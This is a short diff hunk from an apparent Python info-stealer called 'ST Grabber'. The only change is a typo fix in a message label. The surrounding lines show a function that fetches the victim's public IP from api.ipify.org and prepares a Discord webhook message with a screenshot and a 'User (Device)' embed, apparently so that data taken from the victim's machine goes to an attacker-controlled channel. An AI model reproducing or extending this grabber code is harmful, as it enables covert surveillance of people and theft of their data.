@@ -57,7 +57,7 @@ else:
 def sg():
 
  ip = get('https://api.ipify.org').text 
- webhook = DiscordWebhook(url=DISCORD_WEBHOOK,username="ST Grabber",content="Screen Shot :")
+ webhook = DiscordWebhook(url=DISCORD_WEBHOOK,username="ST Grabber",content="Screenshot :")
  embed = DiscordEmbed(title="PT-H14", description="**User (Device)**", color=0xfff700) 
  embed.set_author(name="ST", icon_url="https://www.shareicon.net/data/512x512/2015/09/28/647652_watch_512x512.png") 
  embed.set_thumbnail(url="https://www.blackhatwisdom.com/wp-content/uploads/2016/10/black-hat-wisdom-logo-2.png") 
